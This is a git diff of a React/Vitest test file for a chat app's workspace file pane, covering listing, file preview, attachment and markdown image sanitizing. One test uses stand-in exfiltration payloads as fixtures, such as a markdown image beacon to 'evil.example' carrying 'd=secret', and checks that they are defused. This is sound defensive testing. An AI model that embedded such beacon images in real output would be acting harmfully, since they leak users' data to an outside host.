@@ -1,24 +1,19 @@
 import React from "react";
 import { renderToStaticMarkup } from "react-dom/server";
-import { describe, expect, it } from "vitest";
-import { Markdown } from "@abstractframework/panel-chat";
+import { describe, expect, it, vi } from "vitest";
+import { Markdown, formatBytes, workspaceContentUrl, type RunWorkspace } from "@abstractframework/panel-chat";
 import {
   FilePreview,
   PREVIEW_TEXT_LIMIT,
+  SessionFiles,
   attachOutcomeNotice,
   attachPrecheck,
-  parseListing,
   partialPreviewNote,
   readBoundedText,
   safeMarkdownImages,
-  WorkspaceFileList,
   WorkspaceHeader,
   canOpenFolder,
-  formatBytes,
   previewKind,
-  workspaceContentUrl,
-  workspaceFilesUrl,
-  type RunWorkspace,
 } from "./session_files";
 
 const noop = () => {};
@@ -67,45 +62,22 @@ describe("session workspace header", () => {
 });
 
 describe("session workspace listing", () => {
-  it("lists folders first with sizes, and states a truncated listing explicitly", () => {
+  // Listing, routes and validation are the shared panel-chat WorkspaceBrowser
+  // (tested in abstractuic); here: the pane renders it, titled, for the run.
+  it("renders the shared workspace browser for the run, with its title", () => {
     const html = renderToStaticMarkup(
-      <WorkspaceFileList
-        listing={{
-          path: "",
-          truncated: true,
-          entries: [
-            { name: "notes.md", path: "notes.md", type: "file", size_bytes: 2048, mtime: "2026-09-25T10:00:00Z" },
-            { name: "src", path: "src", type: "dir" },
-          ],
-        }}
-        onOpenDir={noop}
-        onSelectFile={noop}
-      />,
+      <SessionFiles runId="r1" enabled heading="Automation folder" onAttachFiles={() => []} />,
     );
-    expect(html.indexOf("src/")).toBeLessThan(html.indexOf("notes.md"));
-    expect(html).toContain("2.0 KiB");
-    expect(html).toContain("listed only part of this folder (2 entries shown)");
+    expect(html).toContain('class="pc-ws code-workspace-browser"');
+    expect(html).toContain('aria-label="Automation folder"');
   });
 
-  it("does not claim truncation when the gateway says the list is complete", () => {
+  it("shows nothing but the empty state before there is a run", () => {
     const html = renderToStaticMarkup(
-      <WorkspaceFileList
-        listing={{ path: "", truncated: false, entries: [] }}
-        onOpenDir={noop}
-        onSelectFile={noop}
-      />,
+      <SessionFiles runId="" enabled onAttachFiles={() => []} />,
     );
-    expect(html).not.toContain("listed only part");
-    expect(html).toContain("This folder is empty.");
-  });
-
-  it("addresses the run-scoped routes", () => {
-    expect(workspaceFilesUrl("r/1", "src/app")).toBe(
-      "/api/gateway/runs/r%2F1/workspace/files?path=src%2Fapp&recursive=false",
-    );
-    expect(workspaceContentUrl("r1", "a b.md")).toBe(
-      "/api/gateway/runs/r1/workspace/content?path=a+b.md",
-    );
+    expect(html).not.toContain("pc-ws");
+    expect(html).toContain("This conversation&#x27;s files appear here.");
   });
 });
 
@@ -128,7 +100,7 @@ describe("file preview", () => {
   const entry = { name: "page.html", path: "out/page.html", type: "file" as const, size_bytes: 10 };
   const render = (state: any, e = entry) =>
     renderToStaticMarkup(
-      <FilePreview entry={e} url="/api/gateway/x" state={state} onAttach={noop} attaching={false} />,
+      <FilePreview entry={e} url="api/gateway/x" state={state} onAttach={noop} attaching={false} />,
     );
 
   it("shows HTML as source, never rendered", () => {
@@ -138,7 +110,7 @@ describe("file preview", () => {
   });
 
   it("renders images from the content URL and offers binaries as a download", () => {
-    expect(render({ status: "ready", kind: "image", partial: false })).toContain('<img class="code-file-preview-image" src="/api/gateway/x"');
+    expect(render({ status: "ready", kind: "image", partial: false })).toContain('<img class="code-file-preview-image" src="api/gateway/x"');
     const binary = render({ status: "ready", kind: "binary", partial: false });
     expect(binary).toContain("No preview for this file type");
     expect(binary).toContain('download="page.html"');
@@ -157,23 +129,6 @@ describe("file preview", () => {
     expect(render({ status: "error", message: "Preview failed (404): no route" })).toContain(
       "Preview failed (404): no route",
     );
-  });
-});
-
-describe("listing validation", () => {
-  it("keeps the gateway's truncated flag", () => {
-    const listing = parseListing({ path: "", entries: [{ name: "a", path: "a", type: "file" }], truncated: true }, "");
-    expect(listing.truncated).toBe(true);
-    const html = renderToStaticMarkup(<WorkspaceFileList listing={listing} onOpenDir={noop} onSelectFile={noop} />);
-    expect(html).toContain("listed only part of this folder (1 entries shown)");
-    expect(parseListing({ entries: [], truncated: false }, "sub").path).toBe("sub");
-  });
-
-  it("treats a malformed or older response as an error, not an empty folder", () => {
-    expect(() => parseListing({ items: [] }, "")).toThrow(/Unexpected \/workspace\/files response.*entries/);
-    expect(() => parseListing({ entries: [] }, "")).toThrow(/truncated/);
-    expect(() => parseListing({ entries: [{ name: "x" }], truncated: false }, "")).toThrow(/entry 1/);
-    expect(() => parseListing(null, "")).toThrow(/not an object/);
   });
 });
 
@@ -225,6 +180,7 @@ describe("attach from the workspace", () => {
 
 describe("markdown preview images", () => {
   it("renders workspace images and turns remote ones into links", () => {
+    vi.stubGlobal("document", { baseURI: "http://code.test/apps/code/" });
     const md = [
       "![plot](figs/plot.png)",
       "![beacon](https://evil.example/t.gif?d=secret)",
@@ -235,13 +191,14 @@ describe("markdown preview images", () => {
       "```",
     ].join("\n");
     const safe = safeMarkdownImages(md, "r1", "docs/README.md");
-    expect(safe).toContain("![plot](/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png)");
+    expect(safe).toContain("![plot](http://code.test/apps/code/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png)");
     expect(safe).toContain("[image: beacon](https://evil.example/t.gif?d=secret)");
     expect(safe).toContain("[image: pix](//evil.example/p.png)");
     expect(safe).toContain("[image: up](../../escape.png)");
     expect(safe).toContain("![code](https://example.com/in-code.png)");
     const html = renderToStaticMarkup(<Markdown text={safe.split("```")[0]} />);
-    expect(html).toContain('src="/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png"');
+    expect(html).toContain('src="http://code.test/apps/code/api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png"');
+    vi.unstubAllGlobals();
     expect(html).not.toMatch(/<img[^>]+src="(https?:)?\/\/evil/);
   });
 });
